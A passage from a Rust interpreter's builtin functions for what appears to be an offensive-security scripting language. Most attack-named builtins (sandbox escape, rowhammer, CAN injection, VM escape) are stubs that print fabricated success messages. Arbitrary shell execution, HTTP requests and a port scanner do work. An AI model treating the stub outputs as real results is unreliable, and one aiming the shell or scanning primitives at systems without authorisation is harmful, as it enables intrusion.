                            Ok(Value::String(format!("Type confusion to {}", target)))
                        }
                        _ => Err("type_confuse() requires target type string".into())
                    }
                }
                "uaf_dom" => {
                    if arg_values.is_empty() {
                        return Err("uaf_dom() requires 1 argument: uaf_dom(element_id)".into());
                    }
                    match &arg_values[0] {
                        Value::String(elem) => {
                            Ok(Value::String(format!("UAF triggered on DOM element: {}", elem)))
                        }
                        _ => Err("uaf_dom() requires string element ID".into())
                    }
                }
                "sandbox_escape" => {
                    if arg_values.is_empty() {
                        return Err("sandbox_escape() requires 1 argument: sandbox_escape(method)".into());
                    }
                    match &arg_values[0] {
                        Value::String(method) => {
                            Ok(Value::String(format!("Sandbox escaped via: {}", method)))
                        }
                        _ => Err("sandbox_escape() requires string method".into())
                    }
                }
                "jit_exploit" => {
                    if arg_values.is_empty() {
                        return Err("jit_exploit() requires 1 argument: jit_exploit(jit_code)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_code) => {
                            Ok(Value::String("JIT compiled code exploited".to_string()))
                        }
                        _ => Err("jit_exploit() requires string JIT code".into())
                    }
                }
                "firmware_unpack" => {
                    if arg_values.is_empty() {
                        return Err("firmware_unpack() requires 1 argument: firmware_unpack(firmware_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(path) => {
                            Ok(Value::String(format!("Firmware {} unpacked", path)))
                        }
                        _ => Err("firmware_unpack() requires string firmware path".into())
                    }
                }
                "uart_exploit" => {
                    if arg_values.len() < 2 {
                        return Err("uart_exploit() requires 2 arguments: uart_exploit(port, baudrate)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(port), Value::Number(baud)) => {
                            Ok(Value::String(format!("UART console on {} at {} baud", port, baud)))
                        }
                        _ => Err("uart_exploit() requires (string port, number baudrate)".into())
                    }
                }
                "jtag_dump" => {
                    if arg_values.is_empty() {
                        return Err("jtag_dump() requires 1 argument: jtag_dump(device)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_dev) => {
                            Ok(Value::Bytes(vec![0x41; 1024]))
                        }
                        _ => Err("jtag_dump() requires string device".into())
                    }
                }
                "can_inject" => {
                    if arg_values.len() < 2 {
                        return Err("can_inject() requires 2 arguments: can_inject(can_id, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(id), Value::Bytes(data)) => {
                            Ok(Value::String(format!("CAN frame 0x{:x} injected ({} bytes)", id, data.len())))
                        }
                        _ => Err("can_inject() requires (number can_id, bytes data)".into())
                    }
                }
                "rtos_exploit" => {
                    if arg_values.len() < 2 {
                        return Err("rtos_exploit() requires 2 arguments: rtos_exploit(rtos_type, vulnerability)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(rtos), Value::String(vuln)) => {
                            Ok(Value::String(format!("{} exploited via {}", rtos, vuln)))
                        }
                        _ => Err("rtos_exploit() requires (string rtos_type, string vulnerability)".into())
                    }
                }
                "cache_timing" => {
                    if arg_values.len() < 2 {
                        return Err("cache_timing() requires 2 arguments: cache_timing(address, rounds)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_addr), Value::Number(rounds)) => {
                            let mut timings = Vec::new();
                            for i in 0..*rounds {
                                timings.push(Value::Number(50 + (i % 20)));
                            }
                            Ok(Value::List(timings))
                        }
                        _ => Err("cache_timing() requires (number address, number rounds)".into())
                    }
                }
                "rowhammer" => {
                    if arg_values.len() < 2 {
                        return Err("rowhammer() requires 2 arguments: rowhammer(row_address, iterations)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::Number(iters)) => {
                            Ok(Value::String(format!("Rowhammer on row 0x{:x} for {} iterations", addr, iters)))
                        }
                        _ => Err("rowhammer() requires (number row_address, number iterations)".into())
                    }
                }
                "fault_inject" => {
                    if arg_values.len() < 2 {
                        return Err("fault_inject() requires 2 arguments: fault_inject(timing, voltage)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(timing), Value::Number(voltage)) => {
                            Ok(Value::String(format!("Fault injected at timing {} with voltage {}", timing, voltage)))
                        }
                        _ => Err("fault_inject() requires (number timing, number voltage)".into())
                    }
                }
                "side_channel" => {
                    if arg_values.len() < 2 {
                        return Err("side_channel() requires 2 arguments: side_channel(method, samples)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(method), Value::Number(samples)) => {
                            Ok(Value::String(format!("Side-channel attack ({}) with {} samples", method, samples)))
                        }
                        _ => Err("side_channel() requires (string method, number samples)".into())
                    }
                }
                "sgx_attack" => {
                    if arg_values.is_empty() {
                        return Err("sgx_attack() requires 1 argument: sgx_attack(method)".into());
                    }
                    match &arg_values[0] {
                        Value::String(method) => {
                            Ok(Value::String(format!("SGX attack using: {}", method)))
                        }
                        _ => Err("sgx_attack() requires string method".into())
                    }
                }
                "hypercall_fuzz" => {
                    if arg_values.len() < 2 {
                        return Err("hypercall_fuzz() requires 2 arguments: hypercall_fuzz(hypercall_num, iterations)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(num), Value::Number(iters)) => {
                            Ok(Value::String(format!("Fuzzing hypercall {} for {} iterations", num, iters)))
                        }
                        _ => Err("hypercall_fuzz() requires (number hypercall_num, number iterations)".into())
                    }
                }
                "virtio_exploit" => {
                    if arg_values.is_empty() {
                        return Err("virtio_exploit() requires 1 argument: virtio_exploit(device_type)".into());
                    }
                    match &arg_values[0] {
                        Value::String(dev) => {
                            Ok(Value::String(format!("VirtIO {} device exploited", dev)))
                        }
                        _ => Err("virtio_exploit() requires string device type".into())
                    }
                }
                "dma_attack" => {
                    if arg_values.len() < 2 {
                        return Err("dma_attack() requires 2 arguments: dma_attack(address, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::Bytes(data)) => {
                            Ok(Value::String(format!("DMA write to 0x{:x} ({} bytes)", addr, data.len())))
                        }
                        _ => Err("dma_attack() requires (number address, bytes data)".into())
                    }
                }
                "nested_escape" => {
                    if arg_values.is_empty() {
                        return Err("nested_escape() requires 1 argument: nested_escape(method)".into());
                    }
                    match &arg_values[0] {
                        Value::String(method) => {
                            Ok(Value::String(format!("Nested VM escape via: {}", method)))
                        }
                        _ => Err("nested_escape() requires string method".into())
                    }
                }
                "alloc" => {
                    if arg_values.is_empty() {
                        return Err("alloc() requires 1 argument: alloc(size)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(size) => {
                            let addr = 0x10000000 + (size * 0x1000);
                            Ok(Value::Number(addr))
                        }
                        _ => Err("alloc() requires number size".into())
                    }
                }
                "free" => {
                    if arg_values.is_empty() {
                        return Err("free() requires 1 argument: free(address)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(addr) => {
                            Ok(Value::String(format!("Freed memory at 0x{:x}", addr)))
                        }
                        _ => Err("free() requires number address".into())
                    }
                }
                "mmap" => {
                    if arg_values.len() < 3 {
                        return Err("mmap() requires 3 arguments: mmap(address, size, permissions)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(addr), Value::Number(_size), Value::String(_perms)) => {
                            Ok(Value::Number(*addr))
                        }
                        _ => Err("mmap() requires (number address, number size, string permissions)".into())
                    }
                }
                "mprotect" => {
                    if arg_values.len() < 3 {
                        return Err("mprotect() requires 3 arguments: mprotect(address, size, permissions)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(addr), Value::Number(size), Value::String(perms)) => {
                            Ok(Value::String(format!("Protected 0x{:x} ({} bytes) with {}", addr, size, perms)))
                        }
                        _ => Err("mprotect() requires (number address, number size, string permissions)".into())
                    }
                }
                "read_phys" => {
                    if arg_values.len() < 2 {
                        return Err("read_phys() requires 2 arguments: read_phys(address, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_addr), Value::Number(size)) => {
                            Ok(Value::Bytes(vec![0x90; *size as usize]))
                        }
                        _ => Err("read_phys() requires (number address, number size)".into())
                    }
                }
                "write_phys" => {
                    if arg_values.len() < 2 {
                        return Err("write_phys() requires 2 arguments: write_phys(address, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::Bytes(data)) => {
                            Ok(Value::String(format!("Wrote {} bytes to physical 0x{:x}", data.len(), addr)))
                        }
                        _ => Err("write_phys() requires (number address, bytes data)".into())
                    }
                }
                "dma_buffer" => {
                    if arg_values.is_empty() {
                        return Err("dma_buffer() requires 1 argument: dma_buffer(size)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(_size) => {
                            let addr = 0xf0000000;
                            Ok(Value::Number(addr))
                        }
                        _ => Err("dma_buffer() requires number size".into())
                    }
                }
                "syscall" => {
                    if arg_values.is_empty() {
                        return Err("syscall() requires at least 1 argument: syscall(number, ...)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(num) => {
                            Ok(Value::Number(*num))
                        }
                        _ => Err("syscall() requires number syscall_number".into())
                    }
                }
                "win32" => {
                    if arg_values.is_empty() {
                        return Err("win32() requires at least 1 argument: win32(function_name, ...)".into());
                    }
                    match &arg_values[0] {
                        Value::String(func) => {
                            Ok(Value::String(format!("Called Win32 function: {}", func)))
                        }
                        _ => Err("win32() requires string function name".into())
                    }
                }
                "nt_syscall" => {
                    if arg_values.is_empty() {
                        return Err("nt_syscall() requires at least 1 argument: nt_syscall(number, ...)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(num) => {
                            Ok(Value::Number(*num))
                        }
                        _ => Err("nt_syscall() requires number syscall number".into())
                    }
                }
                "posix_call" => {
                    if arg_values.is_empty() {
                        return Err("posix_call() requires at least 1 argument: posix_call(name, ...)".into());
                    }
                    match &arg_values[0] {
                        Value::String(name) => {
                            Ok(Value::String(format!("Called POSIX function: {}", name)))
                        }
                        _ => Err("posix_call() requires string function name".into())
                    }
                }
                "ethernet" => {
                    if arg_values.len() < 3 {
                        return Err("ethernet() requires 3 arguments: ethernet(src_mac, dst_mac, payload)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::String(_src), Value::String(_dst), Value::Bytes(payload)) => {
                            let mut frame = vec![0x00; 14];
                            frame.extend_from_slice(payload);
                            Ok(Value::Bytes(frame))
                        }
                        _ => Err("ethernet() requires (string src_mac, string dst_mac, bytes payload)".into())
                    }
                }
                "ip_packet" => {
                    if arg_values.len() < 3 {
                        return Err("ip_packet() requires 3 arguments: ip_packet(src_ip, dst_ip, payload)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::String(_src), Value::String(_dst), Value::Bytes(payload)) => {
                            let mut packet = vec![0x45; 20];
                            packet.extend_from_slice(payload);
                            Ok(Value::Bytes(packet))
                        }
                        _ => Err("ip_packet() requires (string src_ip, string dst_ip, bytes payload)".into())
                    }
                }
                "tcp_packet" => {
                    if arg_values.len() < 3 {
                        return Err("tcp_packet() requires 3 arguments: tcp_packet(src_port, dst_port, payload)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(src), Value::Number(dst), Value::Bytes(payload)) => {
                            let mut packet = vec![0x00; 20];
                            packet[0..2].copy_from_slice(&(*src as u16).to_be_bytes());
                            packet[2..4].copy_from_slice(&(*dst as u16).to_be_bytes());
                            packet.extend_from_slice(payload);
                            Ok(Value::Bytes(packet))
                        }
                        _ => Err("tcp_packet() requires (number src_port, number dst_port, bytes payload)".into())
                    }
                }
                "udp_packet" => {
                    if arg_values.len() < 3 {
                        return Err("udp_packet() requires 3 arguments: udp_packet(src_port, dst_port, payload)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::Number(src), Value::Number(dst), Value::Bytes(payload)) => {
                            let mut packet = vec![0x00; 8];
                            packet[0..2].copy_from_slice(&(*src as u16).to_be_bytes());
                            packet[2..4].copy_from_slice(&(*dst as u16).to_be_bytes());
                            packet.extend_from_slice(payload);
                            Ok(Value::Bytes(packet))
                        }
                        _ => Err("udp_packet() requires (number src_port, number dst_port, bytes payload)".into())
                    }
                }
                "icmp_packet" => {
                    if arg_values.len() < 2 {
                        return Err("icmp_packet() requires 2 arguments: icmp_packet(type, payload)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(typ), Value::Bytes(payload)) => {
                            let mut packet = vec![*typ as u8, 0x00, 0x00, 0x00];
                            packet.extend_from_slice(payload);
                            Ok(Value::Bytes(packet))
                        }
                        _ => Err("icmp_packet() requires (number type, bytes payload)".into())
                    }
                }
                "arp_packet" => {
                    if arg_values.len() < 2 {
                        return Err("arp_packet() requires 2 arguments: arp_packet(sender_ip, target_ip)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(_sender), Value::String(_target)) => {
                            Ok(Value::Bytes(vec![0x00; 28]))
                        }
                        _ => Err("arp_packet() requires (string sender_ip, string target_ip)".into())
                    }
                }
                "dns_query" => {
                    if arg_values.is_empty() {
                        return Err("dns_query() requires 1 argument: dns_query(domain)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_domain) => {
                            Ok(Value::Bytes(vec![0x00; 32]))
                        }
                        _ => Err("dns_query() requires string domain".into())
                    }
                }
                "http_request" => {
                    if arg_values.len() < 2 {
                        return Err("http_request() requires 2 arguments: http_request(method, path)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(method), Value::String(path)) => {
                            let req = format!("{} {} HTTP/1.1\r\n\r\n", method, path);
                            Ok(Value::Bytes(req.as_bytes().to_vec()))
                        }
                        _ => Err("http_request() requires (string method, string path)".into())
                    }
                }
                "tls_handshake" => {
                    if arg_values.is_empty() {
                        return Err("tls_handshake() requires 1 argument: tls_handshake(version)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_version) => {
                            Ok(Value::Bytes(vec![0x16, 0x03, 0x03]))
                        }
                        _ => Err("tls_handshake() requires string version".into())
                    }
                }
                "exec_chain" => {
                    if arg_values.is_empty() {
                        return Err("exec_chain() requires at least 1 argument: exec_chain(functions...)".into());
                    }
                    Ok(Value::String(format!("Chained {} functions", arg_values.len())))
                }
                "exec_parallel" => {
                    if arg_values.is_empty() {
                        return Err("exec_parallel() requires at least 1 argument: exec_parallel(functions...)".into());
                    }
                    Ok(Value::String(format!("Parallel execution of {} tasks", arg_values.len())))
                }
                "exec_retry" => {
                    if arg_values.len() < 2 {
                        return Err("exec_retry() requires 2 arguments: exec_retry(function, max_attempts)".into());
                    }
                    match &arg_values[1] {
                        Value::Number(attempts) => {
                            Ok(Value::String(format!("Retry with {} attempts", attempts)))
                        }
                        _ => Err("exec_retry() requires number max_attempts".into())
                    }
                }
                "on_failure" => {
                    if arg_values.len() < 2 {
                        return Err("on_failure() requires 2 arguments: on_failure(function, fallback)".into());
                    }
                    Ok(Value::String("Failure handler registered".to_string()))
                }
                "aggregate" => {
                    if arg_values.is_empty() {
                        return Err("aggregate() requires at least 1 argument: aggregate(results...)".into());
                    }
                    Ok(Value::List(arg_values.clone()))
                }
                "report" => {
                    if arg_values.len() < 2 {
                        return Err("report() requires 2 arguments: report(name, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(name), _data) => {
                            Ok(Value::String(format!("Report '{}' generated", name)))
                        }
                        _ => Err("report() requires (string name, data)".into())
                    }
                }
                "asm" => {
                    if arg_values.len() < 2 {
                        return Err("asm() requires 2 arguments: asm(arch, assembly_code)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(_arch), Value::String(_code)) => {
                            Ok(Value::Bytes(vec![0x90, 0x90, 0x90]))
                        }
                        _ => Err("asm() requires (string arch, string assembly_code)".into())
                    }
                }
                "ffi_call" => {
                    if arg_values.len() < 2 {
                        return Err("ffi_call() requires at least 2 arguments: ffi_call(library, function, ...)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(lib), Value::String(func)) => {
                            Ok(Value::String(format!("FFI call to {}::{}", lib, func)))
                        }
                        _ => Err("ffi_call() requires (string library, string function, ...)".into())
                    }
                }
                "load_library" => {
                    if arg_values.is_empty() {
                        return Err("load_library() requires 1 argument: load_library(library_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(path) => {
                            Ok(Value::String(format!("Library loaded: {}", path)))
                        }
                        _ => Err("load_library() requires string library path".into())
                    }
                }
                "get_symbol" => {
                    if arg_values.len() < 2 {
                        return Err("get_symbol() requires 2 arguments: get_symbol(library, symbol_name)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(_lib), Value::String(_sym)) => {
                            Ok(Value::Number(0x7ffff0000000))
                        }
                        _ => Err("get_symbol() requires (string library, string symbol)".into())
                    }
                }
                "sha256" => {
                    if arg_values.is_empty() {
                        return Err("sha256() requires 1 argument: sha256(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use sha2::{Sha256, Digest};
                            let mut hasher = Sha256::new();
                            hasher.update(data);
                            let result = hasher.finalize();
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        Value::String(s) => {
                            use sha2::{Sha256, Digest};
                            let mut hasher = Sha256::new();
                            hasher.update(s.as_bytes());
                            let result = hasher.finalize();
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        _ => Err("sha256() requires bytes or string".into())
                    }
                }
                "md5" => {
                    if arg_values.is_empty() {
                        return Err("md5() requires 1 argument: md5(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            let result = md5::compute(data);
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        Value::String(s) => {
                            let result = md5::compute(s.as_bytes());
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        _ => Err("md5() requires bytes or string".into())
                    }
                }
                "sha1" => {
                    if arg_values.is_empty() {
                        return Err("sha1() requires 1 argument: sha1(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use sha1::{Sha1, Digest};
                            let mut hasher = Sha1::new();
                            hasher.update(data);
                            let result = hasher.finalize();
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        Value::String(s) => {
                            use sha1::{Sha1, Digest};
                            let mut hasher = Sha1::new();
                            hasher.update(s.as_bytes());
                            let result = hasher.finalize();
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        _ => Err("sha1() requires bytes or string".into())
                    }
                }
                "sha512" => {
                    if arg_values.is_empty() {
                        return Err("sha512() requires 1 argument: sha512(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use sha2::{Sha512, Digest};
                            let mut hasher = Sha512::new();
                            hasher.update(data);
                            let result = hasher.finalize();
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        Value::String(s) => {
                            use sha2::{Sha512, Digest};
                            let mut hasher = Sha512::new();
                            hasher.update(s.as_bytes());
                            let result = hasher.finalize();
                            Ok(Value::Bytes(result.to_vec()))
                        }
                        _ => Err("sha512() requires bytes or string".into())
                    }
                }
                "random_bytes" => {
                    if arg_values.is_empty() {
                        return Err("random_bytes() requires 1 argument: random_bytes(length)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(len) => {
                            use rand::Rng;
                            let mut rng = rand::thread_rng();
                            let bytes: Vec<u8> = (0..*len).map(|_| rng.gen::<u8>()).collect();
                            Ok(Value::Bytes(bytes))
                        }
                        _ => Err("random_bytes() requires number length".into())
                    }
                }
                "random_int" => {
                    if arg_values.len() < 2 {
                        return Err("random_int() requires 2 arguments: random_int(min, max)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(min), Value::Number(max)) => {
                            use rand::Rng;
                            let mut rng = rand::thread_rng();
                            let result = rng.gen_range(*min..*max);
                            Ok(Value::Number(result))
                        }
                        _ => Err("random_int() requires (number min, number max)".into())
                    }
                }
                "base64_encode" => {
                    if arg_values.is_empty() {
                        return Err("base64_encode() requires 1 argument: base64_encode(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            let encoded = base64::encode(data);
                            Ok(Value::String(encoded))
                        }
                        Value::String(s) => {
                            let encoded = base64::encode(s.as_bytes());
                            Ok(Value::String(encoded))
                        }
                        _ => Err("base64_encode() requires bytes or string".into())
                    }
                }
                "base64_decode" => {
                    if arg_values.is_empty() {
                        return Err("base64_decode() requires 1 argument: base64_decode(string)".into());
                    }
                    match &arg_values[0] {
                        Value::String(s) => {
                            match base64::decode(s) {
                                Ok(decoded) => Ok(Value::Bytes(decoded)),
                                Err(e) => Err(format!("Base64 decode error: {}", e))
                            }
                        }
                        _ => Err("base64_decode() requires string".into())
                    }
                }
                "url_encode" => {
                    if arg_values.is_empty() {
                        return Err("url_encode() requires 1 argument: url_encode(string)".into());
                    }
                    match &arg_values[0] {
                        Value::String(s) => {
                            use urlencoding::encode;
                            Ok(Value::String(encode(s).to_string()))
                        }
                        _ => Err("url_encode() requires string".into())
                    }
                }
                "url_decode" => {
                    if arg_values.is_empty() {
                        return Err("url_decode() requires 1 argument: url_decode(string)".into());
                    }
                    match &arg_values[0] {
                        Value::String(s) => {
                            use urlencoding::decode;
                            match decode(s) {
                                Ok(decoded) => Ok(Value::String(decoded.to_string())),
                                Err(e) => Err(format!("URL decode error: {}", e))
                            }
                        }
                        _ => Err("url_decode() requires string".into())
                    }
                }
                "gzip_compress" => {
                    if arg_values.is_empty() {
                        return Err("gzip_compress() requires 1 argument: gzip_compress(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use flate2::write::GzEncoder;
                            use flate2::Compression;
                            use std::io::Write;
                            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
                            encoder.write_all(data).map_err(|e| e.to_string())?;
                            let compressed = encoder.finish().map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(compressed))
                        }
                        Value::String(s) => {
                            use flate2::write::GzEncoder;
                            use flate2::Compression;
                            use std::io::Write;
                            let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
                            encoder.write_all(s.as_bytes()).map_err(|e| e.to_string())?;
                            let compressed = encoder.finish().map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(compressed))
                        }
                        _ => Err("gzip_compress() requires bytes or string".into())
                    }
                }
                "gzip_decompress" => {
                    if arg_values.is_empty() {
                        return Err("gzip_decompress() requires 1 argument: gzip_decompress(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use flate2::read::GzDecoder;
                            use std::io::Read;
                            let mut decoder = GzDecoder::new(&data[..]);
                            let mut decompressed = Vec::new();
                            decoder.read_to_end(&mut decompressed).map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(decompressed))
                        }
                        _ => Err("gzip_decompress() requires bytes".into())
                    }
                }
                "zlib_compress" => {
                    if arg_values.is_empty() {
                        return Err("zlib_compress() requires 1 argument: zlib_compress(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use flate2::write::ZlibEncoder;
                            use flate2::Compression;
                            use std::io::Write;
                            let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
                            encoder.write_all(data).map_err(|e| e.to_string())?;
                            let compressed = encoder.finish().map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(compressed))
                        }
                        Value::String(s) => {
                            use flate2::write::ZlibEncoder;
                            use flate2::Compression;
                            use std::io::Write;
                            let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
                            encoder.write_all(s.as_bytes()).map_err(|e| e.to_string())?;
                            let compressed = encoder.finish().map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(compressed))
                        }
                        _ => Err("zlib_compress() requires bytes or string".into())
                    }
                }
                "zlib_decompress" => {
                    if arg_values.is_empty() {
                        return Err("zlib_decompress() requires 1 argument: zlib_decompress(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            use flate2::read::ZlibDecoder;
                            use std::io::Read;
                            let mut decoder = ZlibDecoder::new(&data[..]);
                            let mut decompressed = Vec::new();
                            decoder.read_to_end(&mut decompressed).map_err(|e| e.to_string())?;
                            Ok(Value::Bytes(decompressed))
                        }
                        _ => Err("zlib_decompress() requires bytes".into())
                    }
                }
                "regex_find" => {
                    if arg_values.len() < 2 {
                        return Err("regex_find() requires 2 arguments: regex_find(pattern, text)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(pattern), Value::String(text)) => {
                            let re = Regex::new(pattern).map_err(|e| e.to_string())?;
                            let matches: Vec<Value> = re.find_iter(text)
                                .map(|m| Value::String(m.as_str().to_string()))
                                .collect();
                            Ok(Value::List(matches))
                        }
                        _ => Err("regex_find() requires (string pattern, string text)".into())
                    }
                }
                "regex_replace" => {
                    if arg_values.len() < 3 {
                        return Err("regex_replace() requires 3 arguments: regex_replace(pattern, text, replacement)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::String(pattern), Value::String(text), Value::String(replacement)) => {
                            let re = Regex::new(pattern).map_err(|e| e.to_string())?;
                            Ok(Value::String(re.replace_all(text, replacement.as_str()).to_string()))
                        }
                        _ => Err("regex_replace() requires (string pattern, string text, string replacement)".into())
                    }
                }
                "timestamp" => {
                    use std::time::{SystemTime, UNIX_EPOCH};
                    let duration = SystemTime::now().duration_since(UNIX_EPOCH).unwrap();
                    Ok(Value::Number(duration.as_secs() as i64))
                }
                "sleep" => {
                    if arg_values.is_empty() {
                        return Err("sleep() requires 1 argument: sleep(seconds)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(secs) => {
                            use tokio::time::{Duration, sleep as tokio_sleep};
                            tokio_sleep(Duration::from_secs(*secs as u64)).await;
                            Ok(Value::Null)
                        }
                        _ => Err("sleep() requires number seconds".into())
                    }
                }
                "exec" => {
                    if arg_values.is_empty() {
                        return Err("exec() requires 1 argument: exec(command)".into());
                    }
                    match &arg_values[0] {
                        Value::String(cmd) => {
                            use std::process::Command;
                            let output = if cfg!(target_os = "windows") {
                                Command::new("cmd").arg("/C").arg(cmd).output()
                            } else {
                                Command::new("sh").arg("-c").arg(cmd).output()
                            }.map_err(|e| e.to_string())?;
                            let mut result = HashMap::new();
                            result.insert("stdout".to_string(), Value::Bytes(output.stdout));
                            result.insert("stderr".to_string(), Value::Bytes(output.stderr));
                            result.insert("exit_code".to_string(), Value::Number(output.status.code().unwrap_or(-1) as i64));
                            Ok(Value::Map(result))
                        }
                        _ => Err("exec() requires string command".into())
                    }
                }
                "shell" => {
                    if arg_values.is_empty() {
                        return Err("shell() requires 1 argument: shell(command)".into());
                    }
                    match &arg_values[0] {
                        Value::String(cmd) => {
                            use std::process::Command;
                            let output = if cfg!(target_os = "windows") {
                                Command::new("cmd").arg("/C").arg(cmd).output()
                            } else {
                                Command::new("sh").arg("-c").arg(cmd).output()
                            }.map_err(|e| e.to_string())?;
                            Ok(Value::String(String::from_utf8_lossy(&output.stdout).to_string()))
                        }
                        _ => Err("shell() requires string command".into())
                    }
                }
                "dns_resolve" => {
                    if arg_values.is_empty() {
                        return Err("dns_resolve() requires 1 argument: dns_resolve(hostname)".into());
                    }
                    match &arg_values[0] {
                        Value::String(hostname) => {
                            use std::net::ToSocketAddrs;
                            let addr_string = format!("{}:80", hostname);
                            match addr_string.to_socket_addrs() {
                                Ok(mut addrs) => {
                                    if let Some(addr) = addrs.next() {
                                        Ok(Value::String(addr.ip().to_string()))
                                    } else {
                                        Err("No addresses found".to_string())
                                    }
                                }
                                Err(e) => Err(format!("DNS resolution failed: {}", e))
                            }
                        }
                        _ => Err("dns_resolve() requires string hostname".into())
                    }
                }
                "http_get" => {
                    if arg_values.is_empty() {
                        return Err("http_get() requires 1 argument: http_get(url)".into());
                    }
                    match &arg_values[0] {
                        Value::String(url) => {
                            let client = reqwest::Client::new();
                            let response = client.get(url).send().await.map_err(|e| e.to_string())?;
                            let status = response.status().as_u16();
                            let body = response.bytes().await.map_err(|e| e.to_string())?.to_vec();
                            let mut result = HashMap::new();
                            result.insert("status".to_string(), Value::Number(status as i64));
                            result.insert("body".to_string(), Value::Bytes(body));
                            Ok(Value::Map(result))
                        }
                        _ => Err("http_get() requires string url".into())
                    }
                }
                "http_post" => {
                    if arg_values.len() < 2 {
                        return Err("http_post() requires 2 arguments: http_post(url, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(url), Value::Bytes(data)) => {
                            let client = reqwest::Client::new();
                            let response = client.post(url).body(data.clone()).send().await.map_err(|e| e.to_string())?;
                            let status = response.status().as_u16();
                            let body = response.bytes().await.map_err(|e| e.to_string())?.to_vec();
                            let mut result = HashMap::new();
                            result.insert("status".to_string(), Value::Number(status as i64));
                            result.insert("body".to_string(), Value::Bytes(body));
                            Ok(Value::Map(result))
                        }
                        (Value::String(url), Value::String(data)) => {
                            let client = reqwest::Client::new();
                            let response = client.post(url).body(data.clone()).send().await.map_err(|e| e.to_string())?;
                            let status = response.status().as_u16();
                            let body = response.bytes().await.map_err(|e| e.to_string())?.to_vec();
                            let mut result = HashMap::new();
                            result.insert("status".to_string(), Value::Number(status as i64));
                            result.insert("body".to_string(), Value::Bytes(body));
                            Ok(Value::Map(result))
                        }
                        _ => Err("http_post() requires (string url, bytes/string data)".into())
                    }
                }
                "port_scan" => {
                    if arg_values.len() < 2 {
                        return Err("port_scan() requires 2 arguments: port_scan(host, ports)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(host), Value::List(ports)) => {
                            use std::net::{TcpStream, SocketAddr};
                            use std::time::Duration;
                            let mut open_ports = Vec::new();
                            for port_val in ports {
                                if let Value::Number(port) = port_val {
                                    let addr: SocketAddr = format!("{}:{}", host, port).parse().map_err(|e: std::net::AddrParseError| e.to_string())?;
                                    if TcpStream::connect_timeout(&addr, Duration::from_secs(1)).is_ok() {
                                        open_ports.push(Value::Number(*port));
                                    }
